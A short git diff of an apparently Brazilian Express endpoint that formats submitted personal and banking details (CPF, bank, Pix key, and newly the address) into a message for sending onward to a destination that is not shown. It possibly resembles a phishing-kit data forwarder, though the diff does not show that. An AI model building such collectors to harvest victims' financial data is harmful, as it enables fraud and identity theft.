@@ -307,19 +307,20 @@ app.post("/api/enviar-dados-bancarios", async (req, res) => {
       });
     }
 
-    // Formatar mensagem com os dados recebidos
-    const mensagem =
-      `*Novos dados bancários recebidos*\n\n` +
-      `*Dados Pessoais:*\n` +
-      `Nome: ${dados.nome}\n` +
-      `Email: ${dados.email}\n` +
-      `Telefone: ${dados.telefone}\n` +
-      `CPF: ${dados.cpf}\n\n` +
-      `*Dados Bancários:*\n` +
-      `Banco: ${dados.banco}\n` +
-      `Tipo de Chave Pix: ${dados.pix_tipo}\n` +
-      `Chave Pix: ${dados.pix_chave}\n\n` +
-      `Enviado em: ${new Date().toLocaleString("pt-BR")}`;
+   const mensagem =
+  `*Novos dados bancários recebidos*\n\n` +
+  `*Dados Pessoais:*\n` +
+  `Nome: ${dados.nome}\n` +
+  `Email: ${dados.email}\n` +
+  `Telefone: ${dados.telefone}\n` +
+  `CPF: ${dados.cpf}\n\n` +
+  `*Dados Bancários:*\n` +
+  `Banco: ${dados.banco}\n` +
+  `Tipo de Chave Pix: ${dados.pix_tipo}\n` +
+  `Chave Pix: ${dados.pix_chave}\n\n` +
+  `*Endereço Cadastrado:*\n` +
+  `${dados.endereco || "Não informado"}\n\n` +
+  `Enviado em: ${new Date().toLocaleString("pt-BR")}`;
 
     console.log("Mensagem formatada, iniciando envio...");
 
